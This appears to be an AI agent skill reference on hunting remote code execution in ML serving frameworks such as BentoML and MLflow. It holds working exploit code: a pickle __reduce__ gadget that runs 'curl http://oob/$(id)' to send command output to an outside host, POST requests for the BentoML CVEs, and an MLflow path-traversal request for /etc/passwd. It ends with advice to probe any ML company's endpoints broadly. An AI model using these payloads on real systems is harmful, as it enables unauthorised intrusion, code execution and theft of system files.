---
name: ml-serving-pickle
description: ml-serving-pickle reference material.
---

# RCE Reference: ML Serving / Unsafe Pickle Deserialization

Part of `skills/hunt-rce/SKILL.md`. Read this ONLY when the target exposes a model-inference or model-registry endpoint (BentoML, MLflow, TorchServe, Triton, Seldon, Ray Serve, KServe, or similar).

---

### Sub-technique I — ML serving / unsafe pickle (2024-2026 Modern Expansion)

```python
# CVE-2025-27520 BentoML deserialize_value() pickle on /summarize
# (NVD-verified CVSS 9.8, Snyk SNYK-PYTHON-BENTOML-9667321, c2an1 disclosure)
# Trigger condition: BentoML 1.3.4 <= version < 1.4.3
import pickle, requests, os
class Evil:
    def __reduce__(self):
        return (os.system, ('curl http://oob/$(id)',))
requests.post('http://target:3000/summarize',
              data=pickle.dumps(Evil()),
              headers={'Content-Type': 'application/vnd.bentoml+pickle'})

# CVE-2025-32375 BentoML runner-server variant (GHSA-7v4r-c989-xh26)
# Trigger condition: BentoML runner_app.py with Payload-* header handling.
# Same pickle gadget, different headers:
requests.post('http://target:3000/v1/predict',
              data=pickle.dumps(Evil()),
              headers={
                  'Payload-Container': 'NdarrayContainer',
                  'Payload-Meta': '{"format":"default"}',
                  'Batch-Size': '1',
                  'args-number': '1',
              })

# CVE-2024-1483/1560/1594 MLflow path traversal family (Huntr disclosed)
# Trigger condition: MLflow <= 2.9.2 (CVE-2024-1483) / <= 2.11.3 (CVE-2024-1594)
# / <= 2.12.0 (CVE-2024-1560). Use # fragment in artifact_location URI.
POST /api/2.0/mlflow/experiments/create HTTP/1.1
{"name":"x","artifact_location":"file:///tmp/x#/../../../../../etc/passwd"}

# Generic ML inference endpoint pickle probe — applies to TorchServe, Triton,
# Seldon, Ray Serve, MLflow, BentoML when any unsafe pickle deserialization sink
# is reachable. Look for these Content-Types in fingerprinting:
#   application/vnd.bentoml+pickle
#   application/x-python-pickle
#   application/x-torch-pickle (TorchServe model archive .mar files)
#   application/octet-stream on /v1/models/<name>:predict
```

### ML serving / inference frameworks

The pickle-everywhere pattern. Model registries, inference servers, and feature stores all serialize with pickle "because tensors". Every framework ships at least one CVE.

- **BentoML CVE-2025-27520** (NVD-verified CVSS 9.8, Snyk SNYK-PYTHON-BENTOML-9667321, c2an1 disclosure via Snyk) — `deserialize_value()` on `/summarize` accepts `application/vnd.bentoml+pickle` body. Universal `__reduce__` gadget works.
- **BentoML CVE-2025-32375** (GHSA-7v4r-c989-xh26) — runner-server variant via `Payload-Container` / `Payload-Meta` headers carrying pickle.
- **BentoML CVE-2024-2912** (Toreon disclosure) — earlier pickle bug, same family.
- **MLflow CVE-2024-1483 / 1560 / 1594** (Huntr-disclosed family) — path traversal in `artifact_location` via `#` URI fragment, reaches arbitrary file read.
- **TorchServe** — historically multiple RCE CVEs in `/management` endpoint and model archive (`.mar`) extraction. Audit pickle handling in any custom handler.
- **Triton Inference Server / Seldon / Ray Serve / KServe** — same family. Probe model-load endpoints for unsafe deserialization.

Hunting: target any `*.ai`, `*.ml`, ML SaaS, or any company with ML workloads. Probe `/v1/models/<name>:predict`, `/api/2.0/mlflow/`, `/summarize`, `/v1/predict` with pickle-content-type. Half of these still don't validate.
